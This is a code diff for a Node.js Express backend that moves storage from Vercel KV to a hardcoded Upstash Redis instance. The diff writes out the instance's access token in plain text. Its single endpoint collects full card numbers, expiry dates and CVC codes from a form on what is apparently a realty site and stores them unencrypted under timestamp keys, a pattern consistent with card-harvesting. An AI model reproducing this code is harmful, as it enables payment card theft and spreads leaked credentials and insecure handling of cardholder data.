@@ -1,21 +1,22 @@
 const express = require('express');
 const bodyParser = require('body-parser');
-const { Redis } = require('@upstash/redis');
 const cors = require('cors');
-const { kv } = require('@vercel/kv'); // Import the @vercel/kv package
+const { Redis } = require('@upstash/redis');
 
 const app = express();
 
-// Define allowed origins (add your Vercel domain)
-const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];
+// Initialize Redis client with Upstash Redis
+const redis = new Redis({
+  url: 'https://normal-mastodon-59365.upstash.io',
+  token: 'AeflAAIjcDFjODRkZTdkYzQ4ZWQ0NjY2YjhjODY0MTBhZDYwMjU4NXAxMA',
+});
 
 app.use(cors({
   origin: function (origin, callback) {
-    // Allow requests with no origin (like mobile apps or curl requests)
+    const allowedOrigins = ['http://localhost:3000', 'https://sun-realty-homes-cl.vercel.app'];
     if (!origin) return callback(null, true);
     if (allowedOrigins.indexOf(origin) === -1) {
-      const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
-      return callback(new Error(msg), false);
+      return callback(new Error('The CORS policy does not allow access from the specified Origin.'), false);
     }
     return callback(null, true);
   }
@@ -23,12 +24,11 @@ app.use(cors({
 
 app.use(bodyParser.json());
 
-// Endpoint to save form data to the KV database
+// Endpoint to save form data to Redis database
 app.post('/api/save-data', async (req, res) => {
   const { cardNumber, expirationDate, cvcCode } = req.body;
 
   if (!cardNumber || cardNumber.length !== 16 || !expirationDate || !cvcCode) {
-    console.error('Invalid data received:', req.body);
     return res.status(400).json({ message: 'Invalid data' });
   }
 
@@ -37,10 +37,9 @@ app.post('/api/save-data', async (req, res) => {
     const timestamp = Date.now();
     const key = `form-data-${timestamp}`;
 
-    // Save data to KV database
-    await kv.set(key, { cardNumber, expirationDate, cvcCode });
+    // Save data to Redis
+    await redis.set(key, JSON.stringify({ cardNumber, expirationDate, cvcCode }));
 
-    console.log('Data saved successfully:', key);
     res.status(200).json({ message: 'Data saved successfully', key });
   } catch (error) {
     console.error('Error saving data:', error);
